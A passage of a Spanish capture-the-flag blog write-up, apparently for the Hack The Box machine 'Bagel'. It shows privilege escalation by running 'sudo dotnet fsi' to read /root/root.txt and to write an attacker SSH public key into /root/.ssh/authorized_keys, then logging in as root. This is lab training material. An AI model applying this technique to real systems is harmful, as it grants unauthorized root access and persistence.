+</code></pre></div><p>Podemos usar <code>dotnet fsi</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">[developer@bagel ~]$ sudo dotnet fsi
+
+Microsoft (R) F# Interactive version 12.0.0.0 for F# 6.0
+Copyright (c) Microsoft Corporation. All Rights Reserved.  
+
+For help type #help;;
+
+&gt;
+</code></pre></div><p>Hay formas de ejecutar comandos de sistema. Sin embargo, esta vez elegí obtener privilegios de lectura/escritura como <code>root</code>. Por ejemplo, podemos leer la <em>flag</em> <code>root.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt; open System.IO.File.ReadAllLines(@"/root/root.txt");;  
+<span class="code-white">val</span> it: <span class="code-dark-cyan">string[]</span> = [|<span class="code-yellow">"4d0a0b2425c34fcc1a2d9fdf6dd244c5"</span>|]
+</code></pre></div><p>Para obtener un shell como <code>root</code>, podemos agregar una clave SSH pública a <code>/root/.ssh/autorized_keys</code>. Primero, nos creamos un par de claves:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh-keygen</span>
+Generating public/private rsa key pair.
+Enter file in which to save the key (~/.ssh/id_rsa): ./root_id_rsa
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in ./root_id_rsa
+Your public key has been saved in ./root_id_rsa.pub
+The key fingerprint is:
+SHA256:ALyCueBYvQCalEvCfJ+C1+K+rh/y7Du4yXTcJN/LvHM
+The key's randomart image is:
++---[RSA 3072]----+
+|o ...            |
+|o* ...           |
+|==+.o.o          |
+|*o++o+ .         |
+|+oo+oo  S        |
+|o...* .          |
+| oo+ o .         |
+|o.*o. o..E       |
+| =*O+  =+        |
++----[SHA256]-----+
+
+<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">root_id_rsa.pub</span>
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTH8lAYNlmUe7OP60e06ThfnUcl2j6HeJciLmqqoeV6tB+GOICpXtGjleiRHg3/hbGzC2OSaew1GGS2RlqRxSFQTmBVOWBhAEOWSg4s2BL7EF+G/uNXZU/70RwUvIjzUAKE6f3n8vbTC6qptEWH30vpU9F/VWufwGrKEP/J1tNAqLs7Es1vUXLPAhtaC9F+AJPqxmvpqNjW8irbFEWDbU/ty7It3uftW9AFCmuk8+pMd/iPsiJ0G5rZeFfLrxhDfRAl3zSl7JlIhu6zTbd5Kv9pRRwdKwntvoJRNALYj9lrImlf/nGZNNCjc1ErUuVAxGCGYs4VgZYgFjn7WnU5eTMCCu+dfaqm3JJKIZngDprDpXxsPqVp05gHFPViPf4SVahSMjkynQ6kAeMfhPk5A4YzeFwVuPEmpn3Y0AAwMbWxm0ky5ZXqMfM6WQw2SXggm7DnR76b/YULcfblUMgMz5n6G1LvKO7rKu/Huh59//pDSlePUqV5lwWp28o07A0Ok8=  
+</code></pre></div><p>Ahora, creamos el archivo y escribimos la clave pública:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>&gt; let file = new System.IO.StreamWriter("/root/.ssh/authorized_keys");;
+<span class="code-white">val</span> file: System.IO.<span class="code-dark-cyan">StreamWriter</span>
+
+&gt; file.WriteLine("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTH8lAYNlmUe7OP60e06ThfnUcl2j6HeJciLmqqoeV6tB+GOICpXtGjleiRHg3/hbGzC2OSaew1GGS2RlqRxSFQTmBVOWBhAEOWSg4s2BL7EF+G/uNXZU/70RwUvIjzUAKE6f3n8vbTC6qptEWH30vpU9F/VWufwGrKEP/J1tNAqLs7Es1vUXLPAhtaC9F+AJPqxmvpqNjW8irbFEWDbU/ty7It3uftW9AFCmuk8+pMd/iPsiJ0G5rZeFfLrxhDfRAl3zSl7JlIhu6zTbd5Kv9pRRwdKwntvoJRNALYj9lrImlf/nGZNNCjc1ErUuVAxGCGYs4VgZYgFjn7WnU5eTMCCu+dfaqm3JJKIZngDprDpXxsPqVp05gHFPViPf4SVahSMjkynQ6kAeMfhPk5A4YzeFwVuPEmpn3Y0AAwMbWxm0ky5ZXqMfM6WQw2SXggm7DnR76b/YULcfblUMgMz5n6G1LvKO7rKu/Huh59//pDSlePUqV5lwWp28o07A0Ok8=");;  
+<span class="code-white">val</span> it: <span class="code-dark-cyan">unit</span> = ()
+
+&gt; file.Close();;
+<span class="code-white">val</span> it: <span class="code-dark-cyan">unit</span> = ()
+
+&gt; #quit;;
+</code></pre></div><p>Y ahora, podemos acceder como <code>root</code> usando la clave privada:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> -i <span class="mtku">root_id_rsa</span> root@10.10.11.201  
+[root@bagel ~]# cat root.txt
+4d0a0b2425c34fcc1a2d9fdf6dd244c5
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#explotación-de-lfr">Explotación de LFR</a></li><li><a href="#ingeniería-inversa-de-la-dll">Ingeniería inversa de la DLL</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#ataque-de-deserialización">Ataque de deserialización</a></li></ul></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail">
+<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
